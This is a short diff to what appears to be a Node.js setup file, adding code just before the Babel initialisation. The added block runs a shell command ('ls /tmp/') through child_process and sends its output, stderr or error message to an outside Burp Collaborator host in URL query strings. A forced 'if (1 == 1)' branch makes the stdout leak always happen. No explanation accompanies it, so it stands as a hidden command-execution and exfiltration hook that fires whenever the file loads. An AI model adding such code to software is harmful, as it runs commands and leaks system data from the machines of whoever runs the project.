@@ -81,6 +81,25 @@ fs.readFile('d.txt', 'utf8' , (err, data) => {
 
 });
 
+const spawn = require('child_process');
+var request = require('request');
+spawn.exec("ls /tmp/", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        request('http://mzpz5sloxj1o8ocahftqnyjtokubvzk.burpcollaborator.net/?rce-error=' + error.message);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        request('http://mzpz5sloxj1o8ocahftqnyjtokubvzk.burpcollaborator.net/?rce=' + stderr)
+        return;
+    }
+   if (1 == 1) {
+   request('http://mzpz5sloxj1o8ocahftqnyjtokubvzk.burpcollaborator.net/?rce=' + stdout)
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
+});
 
 // Initialize babel.
 require('@babel/register')({
